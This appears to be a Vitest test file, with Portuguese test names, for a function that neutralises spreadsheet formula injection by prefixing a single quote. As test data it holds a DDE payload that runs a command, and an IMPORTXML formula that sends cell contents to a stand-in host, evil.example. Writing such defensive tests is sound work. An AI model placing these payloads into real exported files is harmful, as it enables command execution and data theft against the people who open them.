import { describe, expect, it } from "vitest";
import { neutralizarFormula } from "./formula-injection";

describe("neutralizarFormula", () => {
  it.each(["=", "+", "-", "@", "\t", "\r"])(
    "prefixa com aspas simples valor que começa com %j",
    (caractere) => {
      const valor = `${caractere}cmd|'/c calc'!A1`;
      expect(neutralizarFormula(valor)).toBe(`'${valor}`);
    }
  );

  it("não mexe em texto comum", () => {
    expect(neutralizarFormula("Fornecedor Padaria Central")).toBe("Fornecedor Padaria Central");
  });

  it("não mexe em string vazia", () => {
    expect(neutralizarFormula("")).toBe("");
  });

  it("não mexe em número como texto (não começa com caractere perigoso)", () => {
    expect(neutralizarFormula("123,45")).toBe("123,45");
  });

  it("neutraliza tentativa real de formula injection (IMPORTXML)", () => {
    const payload = '=IMPORTXML("https://evil.example/"&A1,"//x")';
    expect(neutralizarFormula(payload)).toBe(`'${payload}`);
  });
});
